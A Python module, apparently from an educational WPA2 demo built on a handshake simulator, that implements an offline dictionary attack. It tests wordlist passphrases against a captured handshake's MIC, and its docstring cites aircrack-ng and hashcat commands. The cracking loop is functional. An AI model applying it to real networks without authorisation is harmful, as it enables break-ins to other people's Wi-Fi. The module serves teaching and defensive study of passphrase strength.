"""
dictionary_attack.py
=====================
Offline dictionary attack against a captured WPA2 4-way handshake.

This is the exact technique real tools implement:
    - aircrack-ng   (aircrack-ng -w wordlist.txt capture.cap)
    - hashcat       (hashcat -m 22000 handshake.hc22000 wordlist.txt)
    - cowpatty

For every candidate passphrase in a wordlist, we run the real key-derivation
chain (PBKDF2-HMAC-SHA1 PSK->PMK, then the 802.11i PRF PMK->PTK, then
HMAC-SHA1 for the MIC) and compare the resulting MIC against the one
captured in the handshake. A match means the candidate passphrase is
provably correct -- no further contact with the AP is needed at any point.

Because PBKDF2 here runs 4096 HMAC-SHA1 rounds per guess, this is
*deliberately* slow compared to an unsalted/fast hash -- which is precisely
why real WPA2 cracking throughput is measured in thousands of guesses/sec on
a CPU (or higher with GPU acceleration), not billions, and why a strong,
high-entropy passphrase remains an effective defense even after a handshake
has been captured.
"""

from __future__ import annotations

import time
from dataclasses import dataclass

from handshake_simulator import CapturedHandshake
from wpa2_crypto import mic_for_passphrase


@dataclass
class CrackResult:
    cracked: bool
    passphrase: str | None
    candidates_tried: int
    elapsed_seconds: float

    @property
    def guesses_per_second(self) -> float:
        if self.elapsed_seconds <= 0:
            return float("inf")
        return self.candidates_tried / self.elapsed_seconds


def crack_handshake(handshake: CapturedHandshake, wordlist: list[str], verbose: bool = True) -> CrackResult:
    """Try every passphrase in `wordlist` against the captured handshake.

    Returns as soon as a MIC match is found (mirroring how real cracking
    tools stop on first match), or after exhausting the wordlist.
    """
    material = handshake.material()
    start = time.perf_counter()
    tried = 0

    for candidate in wordlist:
        tried += 1
        try:
            candidate_mic = mic_for_passphrase(candidate, material)
        except ValueError:
            # Real tools also skip candidates outside the valid 8-63 char
            # WPA2 passphrase length rather than crashing the whole run.
            if verbose:
                print(f"  [skip] {candidate!r} is not a valid WPA2 passphrase length (8-63 chars)")
            continue

        if verbose:
            print(f"  [{tried:>4}] trying {candidate!r:<24} -> MIC {candidate_mic.hex()}")

        if candidate_mic == handshake.captured_mic:
            elapsed = time.perf_counter() - start
            if verbose:
                print(f"  MATCH -- captured MIC reproduced by passphrase {candidate!r}")
            return CrackResult(True, candidate, tried, elapsed)

    elapsed = time.perf_counter() - start
    return CrackResult(False, None, tried, elapsed)


def load_wordlist(path: str) -> list[str]:
    """Load one candidate passphrase per line, skipping blanks/comments."""
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]
